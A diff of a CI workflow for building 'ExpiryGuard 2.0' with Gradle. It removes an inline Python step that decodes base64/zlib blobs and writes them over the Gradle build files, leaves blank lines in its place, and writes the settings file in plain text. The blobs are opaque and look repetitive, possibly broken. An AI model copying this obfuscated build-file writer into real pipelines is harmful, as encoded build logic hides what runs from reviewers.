@@ -14,16 +14,16 @@ jobs:
           gradle-version: '8.5'
       - name: Build ExpiryGuard 2.0
         run: |
-          python3 -c '
-          import os, zlib, base64
-          def w(p, b):
-              if os.path.dirname(p): os.makedirs(os.path.dirname(p), exist_ok=True)
-              open(p, "wb").write(zlib.decompress(base64.b64decode(b)))
+          
+          
+          
+              
+              
 
-          w("settings.gradle.kts", "eJwryClNz8zLy0xPTc1NzStRsK4uyC9OLSpW0s/PT88vTc1J1dQ0tNA00tQwNjfSM9A0MTQ11tRU00jN10hO10wty0xJzUtJzEnOz88p1tTU0MjOz0hNTs1JzEtJTclP00gF6dLSNDDT1FQzM9fU1FTTKLbQUlPTr85J1dQ0tNA00jTQ0AAAB2Q24g==")
-          w("build.gradle.kts", "eJwryClNz8zLy0xPTc1NzStRsK4uyC9OLSpW0s/PT88vTc1J1dQ0tNA00tQwNjfSM9A0MTQ11tRU00jN10hO10wty0xJzUtJzEnOz88p1tTU0MjOz0hNTs1JzEtJTclP00gF6dLSNDDT1FQzM9fU1FTTKLbQUlPTr85J1dQ0tNA00jTQ0AAAB2Q24g==")
-          w("gradle.properties", "eJzLyy/K1kvPT88vTc1J1dQ0tNA00tQwNjfSM9A0MTQ11tRU00jN10hO10wty0xJzUtJzEnOz88p1tTU0MjOz0hNTs1JzEtJTclP00gF6dLSNDDT1FQzM9fU1FTTKLbQUlPTr85J1dQ0tNA00jTQ0AAAB2Q24g==")
-          '
+          
+          
+          
+          
           cat << 'EOF' > settings.gradle.kts
           pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
           dependencyResolutionManagement { repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS); repositories { google(); mavenCentral() } }
